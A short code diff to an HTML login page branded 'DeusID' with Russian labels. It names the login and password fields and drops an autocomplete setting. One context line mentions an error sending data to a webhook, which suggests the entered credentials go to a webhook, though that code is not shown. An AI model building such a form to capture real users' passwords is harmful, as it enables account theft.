@@ -29,11 +29,11 @@
 			<div class="login">
 				<div class="logintext">DeusID</div>
 				<div class="field">
-					<input type="text" placeholder="">
+					<input type="text" placeholder="" name="login">
 					<div class="placeholder">Логин</div>
 				</div>
 				<div class="field">
-					<input type="password" placeholder="">
+					<input type="password" placeholder="" name="password">
 					<div class="placeholder">Пароль</div>
 				</div>
 				<div class="error">
@@ -148,9 +148,6 @@
 								alert('Произошла ошибка при отправке данных на вебхук');
 							});
 					});
-					// Добавление атрибута autocomplete для сохранения пароля
-					var passwordInput = document.querySelector('input[type="password"]');
-					passwordInput.setAttribute('autocomplete', 'on');
 				});
 			</script>
 		</div>
